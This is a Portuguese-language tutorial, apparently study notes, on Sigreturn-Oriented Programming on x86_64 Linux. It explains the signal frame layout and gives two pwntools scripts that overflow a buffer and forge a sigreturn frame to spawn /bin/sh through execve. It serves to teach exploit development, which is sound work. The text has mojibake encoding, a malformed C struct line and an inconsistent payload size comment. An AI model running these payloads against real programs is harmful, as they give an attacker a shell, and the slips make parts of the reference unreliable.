---
title: SIGROP (Sigreturn-Oriented Programming)
---

Sigreturn Ã© quando um programa Ã© interrompido por um sinal (SIGINT, SIGSEV, etc). 

Quando o programa Ã© interrompido, o kernel salva TODO o estado do programa (registradores). Ao retornar (`sigreturn()`), restaura TUDO o que estava salvo.

Normalmente estamos acostumados como o SIGSEV, que Ã© um erro grave do programa e ele encerra imediatamente. Mas outros erros, como SIGINT, SIGALRM, etc, apenas param a execuÃ§Ã£o salvam o estado, fazem algo e depois voltam exatamente do estado salvo.

|Sinal	|Significado	|Como acontece	|PadrÃ£o|
|-------|---------------|---------------|------|
|SIGINT	|INTERRUPT	|VocÃª aperta Ctrl+C no terminal	|Programa para (pode capturar)|
|SIGSEGV	|SEGMENTATION VIOLATION	|Acesso Ã  memÃ³ria invÃ¡lida	|Programa MORRE|
|SIGALRM	|ALARM	|Timer expira	Programa para |(pode capturar)|
|SIGUSR1	|USER 1	|Enviado por outro processo	|Programa para (pode capturar)|

Um exemplo de cenÃ¡rio de SIGINT:

1. Programa rodando normalmente
2. UsuÃ¡rio aperta Ctrl+C â†’ SIGINT
3. Kernel automaticamente:
   - Pausa programa
   - PUSH: Salva RAX, RBX, RCX, RIP, RSP... na pilha
   - Chama funÃ§Ã£o de tratamento
4. Tratamento faz algo (ex: salvar arquivo)
5. sigreturn() automÃ¡tico:
   - POP: **Restaura RAX, RBX, RCX, RIP, RSP...**
   - Continua execuÃ§Ã£o normal

Podemos forjar uma estrutura na pilha que simula um estado salvo, e chamar `sigreturn()` para carregar nossos valores em TODOS os registradores de uma vez! Isso pois o kernel nÃ£o verifica se o estado sendo restaurado Ã© legÃ­timo.

Isso evita ter que usar muitos gadgets, como fazemos no ROP comum. No SIGROP, controlamos tudo com uma sÃ³ chamada.

## Fazendo o SIGROP

### Entendendo a struct

Quando o kernel salva estado para um sinal, ele cria uma struct na pilha que contÃ©m todo o estado do programa atual. Essa struct estÃ¡ simulada em C abaixo:

```c
// Estado da FPU - Pode ser omitido, pois Ã© apenas um ponteiro na struct.
struct _fpstate {
    uint64_t cwd;
    uint64_t swd;
    // ... muitos campos
};

// Estrutura dos registradores (SIGCONTEXT)
struct sigcontext {
    // Registradores de propÃ³sito geral
    uint64_t r8, r9, r10, r11, r12, r13, r14, r15, rdi, rsi, rbp;
    uint64_t rbx;      // Base Pointer
    uint64_t rdx;rax;rcx;
    uint64_t rsp;      // Stack Pointer
    uint64_t rip;      // Instruction Pointer (CRÃTICO!)
    uint64_t eflags;   // Flags da CPU
    
    // Registradores de segmento (x86_64)
    uint16_t cs;       // Code Segment (deve ser 0x33)
    uint16_t gs;
    uint16_t fs;
    uint16_t __pad0;
    
    // InformaÃ§Ãµes de erro
    uint64_t err, trapno, oldmask;
    uint64_t cr2;      // Page Fault Address
    
    // Ponteiro para estado FPU
    struct _fpstate *fpstate;
    
    // Reservado
    uint64_t __reserved1[8];
};

// Stack do usuÃ¡rio
typedef struct {
    void *ss_sp;
    int ss_flags;
    size_t ss_size;
} stack_t;

// Contexto do usuÃ¡rio
struct ucontext {
    unsigned long uc_flags;
    struct ucontext *uc_link;
    stack_t uc_stack;
    struct sigcontext uc_mcontext;  // REGISTRADORES AQUI! (O QUE MANIPULAMOS)
    sigset_t uc_sigmask;            // MÃ¡scara de sinais
    char __pad[120];                // Padding para alinhamento
};

// Estrutura COMPLETA na pilha
struct rt_sigframe {
    void *pretcode;            // Para retornar do signal handler
    struct ucontext uc;        // Contexto completo
    siginfo_t info;            // InformaÃ§Ã£o do sinal (128 bytes)
    // fpstate pode vir aqui se necessÃ¡rio
};
```

Na stack, terÃ­amos algo como:

```
OFFSET  TAMANHO  CAMPO                   IMPORTÃ‚NCIA
------  -------  ----------------------  ------------------------------------
0x000   8        pretcode                âš ï¸ InÃ­cio do rt_sigframe
0x008   8        uc.uc_flags             ğŸŸ¡ Pode ser 0
0x010   8        uc.uc_link              ğŸŸ¡ Pode ser 0
0x018   8        uc.uc_stack.ss_sp       ğŸŸ¡ Pode ser 0
0x020   8        uc.uc_stack.ss_flags    ğŸŸ¡ Pode ser 0
0x028   8        uc.uc_stack.ss_size     ğŸŸ¡ Pode ser 0
                                                                             
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• SIGCONTEXT COMEÃ‡A AQUI! â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                                                                             
0x030   8        r8                      ğŸŸ¡ Pode ser 0
0x038   8        r9                      ğŸŸ¡ Pode ser 0
0x040   8        r10                     ğŸŸ¡ Pode ser 0
0x048   8        r11                     ğŸŸ¡ Pode ser 0
0x050   8        r12                     ğŸŸ¡ Pode ser 0
0x058   8        r13                     ğŸŸ¡ Pode ser 0
0x060   8        r14                     ğŸŸ¡ Pode ser 0
0x068   8        r15                     ğŸŸ¡ Pode ser 0
0x070   8        rdi                     ğŸ”´ 1Âº ARG (ponteiro "/bin/sh")
0x078   8        rsi                     ğŸ”´ 2Âº ARG (argv = 0/NULL)
0x080   8        rbp                     ğŸŸ¡ Pode ser 0 (se nÃ£o usar)
0x088   8        rbx                     ğŸŸ¡ Pode ser 0
0x090   8        rdx                     ğŸ”´ 3Âº ARG (envp = 0/NULL)
0x098   8        rax                     ğŸ”´ SYSCALL NUMBER (59=execve)
0x0A0   8        rcx                     ğŸŸ¡ Pode ser 0
0x0A8   8        rsp                     ğŸ”´ STACK POINTER (deve ser vÃ¡lido!)
0x0B0   8        rip                     ğŸ”´ INSTRUCTION POINTER (syscall addr)
0x0B8   8        eflags                  ğŸŸ¡ 0x202 (interrupts enabled)
0x0C0   2        cs                      ğŸ”´ 0x33 (64-bit user code segment)
0x0C2   2        gs                      ğŸŸ¡ Pode ser 0
0x0C4   2        fs                      ğŸŸ¡ Pode ser 0
0x0C6   2        __pad0                  ğŸŸ¡ Pode ser 0
0x0C8   8        err                     ğŸŸ¡ Pode ser 0
0x0D0   8        trapno                  ğŸŸ¡ Pode ser 0
0x0D8   8        oldmask                 ğŸŸ¡ Pode ser 0
0x0E0   8        cr2                     ğŸŸ¡ Pode ser 0
0x0E8   8        fpstate                 ğŸŸ¡ Pode ser 0 (NULL)
0x0F0   8        __reserved1[0]          ğŸŸ¡ Pode ser 0
0x0F8   8        __reserved1[1]          ğŸŸ¡ Pode ser 0
0x100   8        __reserved1[2]          ğŸŸ¡ Pode ser 0
0x108   8        __reserved1[3]          ğŸŸ¡ Pode ser 0
0x110   8        __reserved1[4]          ğŸŸ¡ Pode ser 0
0x118   8        __reserved1[5]          ğŸŸ¡ Pode ser 0
0x120   8        __reserved1[6]          ğŸŸ¡ Pode ser 0
0x128   8        __reserved1[7]          ğŸŸ¡ Pode ser 0
                                                                             
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• FIM DO SIGCONTEXT (0x130) â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                                                                             
0x130   128      uc.uc_sigmask           ğŸŸ¡ 16 * 8 = 128 bytes (0s)
0x1B0   224      uc.__pad                ğŸŸ¡ 28 * 8 = 224 bytes (padding)
0x290   128      info                    ğŸŸ¡ siginfo_t (128 bytes de 0)
                                                                             
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• FIM DO RT_SIGFRAME (0x310) â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

### Como fazer a struct na stack

Para fazer o SIGROP vamos chamar usar a syscall `sigreturn()`, que faz a restauraÃ§Ã£o de estado. A `struct sigcontext` precisa vir **imediatamente apÃ³s a syscall**. Cuidado: Se vocÃª criar a struct manualmente (sem pwntools), a syscall `sigreturn()` vai pegar o que estiver na stack, podendo pegar lixo e crashar o programa. Abaixo, vemos como a struct sigcontext

```
ANTES do sigreturn():
[Topo da pilha]
â”œâ”€â”€ ... outros dados ...
â”œâ”€â”€ POP_RAX_ADDR        â† Retorno atual (pop rax; ret)
â”œâ”€â”€ 15                  â† Valor para RAX
â”œâ”€â”€ SYSCALL_ADDR        â† syscall; ret (chama sigreturn)
â””â”€â”€ â†“â†“â†“ AQUI COMEÃ‡A A STRUCT RT_SIGFRAME â†“â†“â†“
    â”œâ”€â”€ pretcode        â† 8 bytes (lixo/endereÃ§o Ãºtil)
    â”œâ”€â”€ uc_flags        â† 8 bytes (0)
    â”œâ”€â”€ uc_link         â† 8 bytes (0)
    â”œâ”€â”€ uc_stack.ss_sp  â† 8 bytes (0)
    â”œâ”€â”€ uc_stack.ss_flags â† 8 bytes (0)
    â”œâ”€â”€ uc_stack.ss_size â† 8 bytes (0)
    â”œâ”€â”€ â†“â†“â†“ AQUI COMEÃ‡A STRUCT SIGCONTEXT â†“â†“â†“
    â”‚   â”œâ”€â”€ r8   = 0
    â”‚   â”œâ”€â”€ r9   = 0
    â”‚   â”œâ”€â”€ ...
    â”‚   â”œâ”€â”€ rdi  = BINSH_ADDR    â† "/bin/sh" aqui!
    â”‚   â”œâ”€â”€ rsi  = 0
    â”‚   â”œâ”€â”€ ...
    â”‚   â”œâ”€â”€ rax  = 59            â† execve syscall number
    â”‚   â”œâ”€â”€ ...
    â”‚   â”œâ”€â”€ rip  = SYSCALL_ADDR  â† ONDE continuar apÃ³s sigreturn
    â”‚   â””â”€â”€ [resto do sigcontext + padding]
    â””â”€â”€ â†“â†“â†“ FIM DO FRAME â†“â†“â†“
```

### Cuidados com a struct

Na struct, vocÃª sÃ³ precisa inicializar os registradores que precisa e inicializar os outros com 0. Mas cuidado! Isso pode dar problema para alguns registradores. Imagine se `rsp` for setado como 0, e o programa tentar acessar a stack!

Assim, hÃ¡ alguns registradores que devem ter uma atenÃ§Ã£o especial:

- `x86_64`
    - CRÃTICOS (nÃ£o podem ser 0) - 
        - `rip`
        - `rsp/rbp` (se for continuar apÃ³s syscall)
        - `cs` (Code Segment, deve ser `0x33` para user-space)
    - IMPORTANTES (depende) - `rdi`, `rsi`, `rdx`, `rax`
    - Os outros podem ser setados com 0.
- `x86`
    - CRÃTICOS (nÃ£o podem ser 0)
        - `eip`
        - `esp/ebp` (se for continuar apÃ³s syscall)
        - `cs` (Code Segment, deve ser `0x73`para user-space)
        - `ss` (Stack Segment, deve ser `0x7b`)
        - `ds` (Data Segment, deve ser `0x7b`)
        - `es` (Extra Segment, deve ser `0x7b`)
    - IMPORTANTES (depende) - `ebx`, `ecx`, `edx`, `eax`
    - Os outros podem ser setados com 0.


O RBP sÃ³ importa **se o programa usa RBP explicitamente**, como :

```
; Acessando variÃ¡veis locais com base em rbp
mov rax, [rbp-8]  ; â† CRASH se RBP invÃ¡lido!

; FunÃ§Ãµes que salvam e restauram rbp
func:
    push rbp        ; Salva RBP antigo
    mov rbp, rsp    ; Novo frame pointer
    ...             ; Usa [rbp+X] para variÃ¡veis
    pop rbp         ; Restaura RBP antigo â† CRASH se RBP invÃ¡lido!
    ret
```

Caso contrÃ¡rio, sÃ³ o RSP importa (existem programas que fazem tudo com base no RSP).

Mas hÃ¡ exceÃ§Ãµes para esses registradores crÃ­ticos. Se vocÃª usar o SIGROP para chamar `execve("/bin/sh")`, por exemplo, **o novo processo substitui o espaÃ§o de memÃ³ria e o estado anterior Ã© destruÃ­do**. Assim, nÃ£o importa se houverem registradores invÃ¡lidos.

Para outras syscalls como `read`, `write`, `open`, **o crash serÃ¡ somente apÃ³s o syscall**, assim vocÃª ainda pode se aproveitar disso para fazer o que tem que ser feito antes do crash.

### VersÃ£o sem SigreturnFrame() do pwntools

O payload abaixo Ã© manual, de modo que montamos a struct que o `sigreturn()` pede na mÃ£o.

```py
from pwn import *

context.arch = 'amd64'

# Offsets
BUFFER_OFFSET = 136
SYSCALL = 0x400100
POP_RAX = 0x4000f0
BINSH = 0x601000
VALID_STACK = 0x7fffffffe000

payload = b"A" * BUFFER_OFFSET

# 1. Chamar sigreturn
payload += p64(POP_RAX)
payload += p64(15)            # sigreturn syscall number
payload += p64(SYSCALL)       # syscall; ret

# 2. Montar rt_sigframe MANUALMENTE
# Parte 1: Campos antes do sigcontext (48 bytes)
frame = b""
frame += p64(0)              # pretcode
frame += p64(0)              # uc_flags
frame += p64(0)              # uc_link
frame += p64(0)              # uc_stack.ss_sp
frame += p64(0)              # uc_stack.ss_flags
frame += p64(0)              # uc_stack.ss_size
# Total: 6 * 8 = 48 bytes

# Parte 2: sigcontext (comeÃ§a aqui!)
# r8-r15 (8 registradores)
frame += p64(0) * 8

# rdi, rsi, rbp, rbx, rdx, rax, rcx
frame += p64(BINSH)          # rdi
frame += p64(0)              # rsi
frame += p64(VALID_STACK)    # rbp
frame += p64(0)              # rbx
frame += p64(0)              # rdx
frame += p64(59)             # rax = execve
frame += p64(0)              # rcx

# rsp, rip (CRÃTICOS!)
frame += p64(VALID_STACK)    # rsp
frame += p64(SYSCALL)        # rip

# eflags
frame += p64(0x202)          # interrupts enabled

# cs, gs, fs, pad
frame += p16(0x33)           # cs (64-bit user)
frame += p16(0)              # gs
frame += p16(0)              # fs
frame += p16(0)              # pad

# err, trapno, oldmask, cr2
frame += p64(0) * 4

# fpstate + reserved[8]
frame += p64(0)              # fpstate
frame += p64(0) * 8          # reserved

# Parte 3: uc_sigmask + padding (128 + 224 bytes)
frame += p64(0) * 16         # uc_sigmask (128 bytes)
frame += p64(0) * 28         # padding para 16-byte align (224 bytes)

# Parte 4: siginfo_t (128 bytes) - opcional mas presente
frame += p64(0) * 16         # 128 bytes

payload += frame

print(f"Frame size: {len(frame)} bytes")
print(f"Total payload: {len(payload)} bytes")
# Resultado: 48 + 320 + 128 + 224 + 128 = ~848 bytes
```

### VersÃ£o com SigreturnFrame() do pwntools

O pwntools possui uma ferramenta prÃ³pria, o `SigreturnFrame`. Ele jÃ¡ possui toda a struct do sigreturn que precisamos. Ã‰ importante ressaltar que todos os registradores que nÃ£o definimos serÃ£o inicializados com 0 por padrÃ£o.

Indico utilizar essa ferramenta, que agiliza a criaÃ§Ã£o do payload e evita erros desnecessÃ¡rios.

```py
from pwn import *

# Contexto da arquitetura
context.arch = 'amd64'
context.os = 'linux'

# Conectar ao alvo
# p = process('./vulneravel')
# OU
# p = remote('alvo.com', 1234)

# OFFSETS (vocÃª precisa descobrir esses)
BUFFER_OFFSET = 136
SYSCALL_ADDR = 0x400100  # EndereÃ§o de um gadget "syscall; ret"
POP_RAX_ADDR = 0x4000f0  # Gadget "pop rax; ret"
BINSH_ADDR = 0x601000    # Onde "/bin/sh" estÃ¡ na memÃ³ria

# Passo 1: Preencher buffer atÃ© atingir o endereÃ§o de retorno
payload = b"A" * BUFFER_OFFSET

# Passo 2: Chamar sigreturn (syscall 15)
payload += p64(POP_RAX_ADDR)  # pop rax; ret
payload += p64(15)            # RAX = 15 (nÃºmero da syscall sigreturn)
payload += p64(SYSCALL_ADDR)  # syscall; ret

# Passo 3: Estrutura forjada do rt_sigframe na pilha
# O pwntools jÃ¡ cria a estrutura COMPLETA automaticamente

sigframe = SigreturnFrame(kernel='amd64')  # Especifica arquitetura
sigframe.rax = 59             # syscall execve
sigframe.rdi = BINSH_ADDR     # endereÃ§o de "/bin/sh"
sigframe.rsi = 0              # argv = NULL
sigframe.rdx = 0              # envp = NULL
sigframe.rip = SYSCALL_ADDR   # syscall apÃ³s sigreturn
sigframe.rsp = 0x7fffffffe000 # stack vÃ¡lida (IMPORTANTE!)
sigframe.cs = 0x33            # code segment 64-bit user

# Se quiser ver o que estÃ¡ sendo criado:
print(f"Tamanho do frame: {len(bytes(sigframe))} bytes")
# ~440 bytes para x86_64

payload += bytes(sigframe)

# Enviar payload
# p.send(payload)
# p.interactive()

print("Payload montado! Tamanho:", len(payload))
```